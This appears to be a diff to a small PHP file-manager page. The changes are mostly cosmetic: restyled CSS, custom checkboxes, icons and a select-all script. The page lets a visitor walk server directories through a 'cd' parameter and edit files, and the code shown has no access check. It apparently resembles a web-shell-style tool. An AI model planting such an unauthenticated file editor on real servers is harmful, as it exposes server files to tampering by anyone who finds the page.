@@ -20,7 +20,7 @@
 		width:100%;
 		font-family: 'Pangolin', cursive;
 		height:350px;
-		border-radius:7px;
+		border-radius:4px;
 		color: #d4d4d4;
 		resize: none;
 		outline: none;
@@ -35,10 +35,25 @@
 	::-webkit-scrollbar-thumb {
     	background: #FF0000;
 	}
+	select.select {
+		background: #242424;
+		padding:0;
+	}
+	select {
+		background: #242424;
+		padding:5px;
+		border-radius:3px;
+		width:100%;
+		font-family: 'Pangolin', cursive;
+		border:2px solid #d4d4d4;
+		background: transparent;
+		color: #d4d4d4;
+		resize: none;
+	}
 	input[type=submit] {
 		padding:5px;
 		font-family: 'Pangolin', cursive;
-		border-radius:7px;
+		border-radius:4px;
 		background: none;
 		border:2px solid #d4d4d4;
 		color: #d4d4d4;
@@ -46,7 +61,6 @@
 		width:100%;
 	}
 	td {
-		border:1px solid #d4d4d4;
 		padding:3px;
 	}
 	td.files {
@@ -54,6 +68,7 @@
 	}
 	td.form {
 		width:10px;
+		text-align: center;
 	}
 	td.action {
 		width:100px;
@@ -68,7 +83,65 @@
 		font-weight: bold;
 	}
 	td.select {
-		width:100px;
+		width:70px;
+	}
+	.icon {
+		width:25px;
+		height:25px;
+	}
+	.container {
+  		display: block;
+  		position: relative;
+  		padding-left: 15px;
+  		margin-bottom: 19px;
+  		cursor: pointer;
+  		-webkit-user-select: none;
+  		-moz-user-select: none;
+  		-ms-user-select: none;
+  		user-select: none;
+	}
+
+	.container input {
+  		position: absolute;
+  		opacity: 0;
+  		cursor: pointer;
+  		height: 0;
+  		width: 0;
+	}
+
+	.checkmark {
+  		position: absolute;
+  		top: 0;
+  		left: 0;
+  		height: 18px;
+  		width: 18px;
+  		border-radius:10px;
+  		background-color: #d4d4d4;
+	}
+	.container:hover input ~ .checkmark {
+  		background-color: #ccc;
+	}
+	.container input:checked ~ .checkmark {
+  		background-color: #2196F3;
+	}
+	.checkmark:after {
+  		content: "";
+  		position: absolute;
+  		display: none;
+	}
+	.container input:checked ~ .checkmark:after {
+  		display: block;
+	}
+	.container .checkmark:after {
+  		left: 6px;
+  		top: 2px;
+  		width: 3px;
+  		height: 8px;
+  		border: solid white;
+ 		border-width: 0 3px 3px 0;
+  		-webkit-transform: rotate(45deg);
+  		-ms-transform: rotate(45deg);
+  		transform: rotate(45deg);
 	}
 </style>
 <table align="center">
@@ -87,6 +160,9 @@ class x {
         $this->cwd 	= $this->cwd();
         $this->cft 	= time();
     }
+    public function vars($x) {
+    	return print($x);
+    }
     public function cwd() {
     	return str_replace('\\', DIRECTORY_SEPARATOR, getcwd());
     }
@@ -104,6 +180,18 @@ class x {
     		return "<font color='green'>{$perms}</font>";
     	} else {
     		return "<font color='red'>{$perms}</font>";
+    	}
+    }
+    public function getimg($filename) {
+    	$this->extension = strtolower(pathinfo($filename, PATHINFO_EXTENSION));
+    	switch ($this->extension) {
+    		case 'php':
+    			$this->vars("https://image.flaticon.com/icons/png/128/337/337947.png");
+    			break;
+    		
+    		default:
+    			$this->vars("https://image.flaticon.com/icons/svg/833/833524.svg");
+    			break;
     	}
     }
     public function size($filename) {
@@ -155,7 +243,9 @@ switch (@$_POST['act']) {
 		?>
 		<tr>
 			<td class="action">
-				<a href="?cd=<?= getcwd() ?>">BACK</a>
+				<a href="?cd=<?= getcwd() ?>">
+					<img src="https://dailycliparts.com/wp-content/uploads/2019/01/Left-Side-Thick-Size-Arrow-Picture-300x259.png" class="icon">
+				</a>
 			</td>
 			<td colspan="2" class="header">
 				EDIT
@@ -188,6 +278,13 @@ switch (@$_POST['act']) {
 				<?= $x->ftime($_POST['file']) ?>
 			</td>
 		</tr>
+		<tr>
+			<td colspan="3">
+				<select name="act" onchange="if(this.value != '0') this.form.submit()" >
+					<option value="edit" selected>EDIT</option>
+				</select>
+			</td>
+		</tr>
 		<form method="post">
 			<tr>
 				<td colspan="3">
@@ -212,16 +309,30 @@ foreach (scandir(getcwd()) as $key => $value) {
 		if ($value === '..') {
 			?>
 			<tr>
-				<td colspan="5">
-					<a href="?cd=<?= dirname(getcwd()) ?>">BACK</a>
+				<td class="form" colspan="2">
+					<a href="?cd=<?= dirname(getcwd()) ?>">
+						<img src="https://dailycliparts.com/wp-content/uploads/2019/01/Left-Side-Thick-Size-Arrow-Picture-300x259.png" class="icon">
+					</a>
 				</td>
+				<td colspan="4" class="header">
+					HOME
+				</td>
+			</tr>
+			<tr>
+				<td colspan="6"></td>
 			</tr>
 			<?php
 		} else {
 			?>
 			<tr>
 				<td class="form">
-					<input type="checkbox" name="value[]" form="myform">
+					<label class='container'>
+						<input type="checkbox" name="value[]" form="myform">
+						<span class='checkmark'></span>
+					</label>
+				</td>
+				<td class="form">
+					<img src="https://image.flaticon.com/icons/svg/716/716784.svg" class="icon">
 				</td>
 				<td class="files">
 					<a href="?cd=<?= getcwd() . DIRECTORY_SEPARATOR . $value ?>"><?= $value ?></a>
@@ -238,7 +349,7 @@ foreach (scandir(getcwd()) as $key => $value) {
 				</td>
 				<form method="post">
 					<td class="select">
-						<select name="act" onchange="if(this.value != '0') this.form.submit()">
+						<select class="select" name="act" onchange="if(this.value != '0') this.form.submit()">
 							<option selected>ACTION</option>
 						</select>
 						<input type="hidden" name="file" value="<?= getcwd() . DIRECTORY_SEPARATOR . $value ?>">
@@ -253,7 +364,13 @@ foreach (scandir(getcwd()) as $key => $value) {
 		?>
 		<tr>
 			<td class="form">
-				<input type="checkbox" name="value[]" form="myform">
+				<label class='container'>
+					<input type="checkbox" name="value[]" form="myform">
+					<span class='checkmark'></span>
+				</label>
+			</td>
+			<td class="form">
+				<img class="icon" src="<?= $x->getimg($value) ?>">
 			</td>
 			<td class="files">
 				<?= $value ?>
@@ -270,7 +387,7 @@ foreach (scandir(getcwd()) as $key => $value) {
 			</td>
 			<form method="post">
 				<td class="select">
-					<select name="act" onchange="if(this.value != '0') this.form.submit()" >
+					<select class="select" name="act" onchange="if(this.value != '0') this.form.submit()" >
 						<option selected>ACTION</option>
 						<option value="edit">EDIT</option>
 					</select>
@@ -282,13 +399,34 @@ foreach (scandir(getcwd()) as $key => $value) {
 }
 ?>
 <tr>
-	<td>
-		<input type="checkbox">
+	<td class="form">
+		<label class='container'>
+			<input onclick="checkAll(this)" type="checkbox">
+			<span class='checkmark'></span>
+		</label>
 	</td>
-	<td colspan="4">
+	<td colspan="5">
 		<select>
 			<option selected>ACTION</option>
 		</select>
 	</td>
 </tr>
+<script type="text/javascript">
+	function checkAll(ele) {
+		var checkboxes = document.getElementsByTagName('input');
+		if (ele.checked) {
+			for (var i = 0; i < checkboxes.length; i++) {
+				if (checkboxes[i].type == 'checkbox' ) {
+					checkboxes[i].checked = true;
+				}
+           	}
+       	} else {
+           	for (var i = 0; i < checkboxes.length; i++) {
+               	if (checkboxes[i].type == 'checkbox') {
+                   	checkboxes[i].checked = false;
+               	}
+           	}
+       	}
+   	}
+</script>
 </table>
